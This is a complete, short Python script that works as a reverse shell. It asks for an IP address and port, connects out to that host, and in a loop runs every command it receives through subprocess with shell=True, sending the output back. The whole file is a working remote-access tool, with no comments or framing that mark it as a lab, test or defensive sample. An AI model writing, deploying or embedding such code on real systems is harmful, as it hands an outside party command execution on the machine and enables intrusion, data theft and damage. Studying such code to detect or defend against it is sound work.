import socket
import subprocess

def main():
    user_port = int(input("Enter the port number: "))
    user_ip = input("Enter the IP address: ")

    try:
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((user_ip, user_port))
    except Exception as e:
        print(f"Connection error: {e}")
        return

    try:
        while True:
            connection.send(b"$ ")
            command = connection.recv(1024).decode('utf-8')
            if not command:
                break

            try:
                result = subprocess.run(command, capture_output=True, text=True, shell=True)
                output = result.stdout + result.stderr
            except Exception as e:
                output = str(e)

            connection.send(output.encode('utf-8'))
    except Exception as e:
        print(f"Error during communication: {e}")
    finally:
        connection.close()

if __name__ == "__main__":
    main()
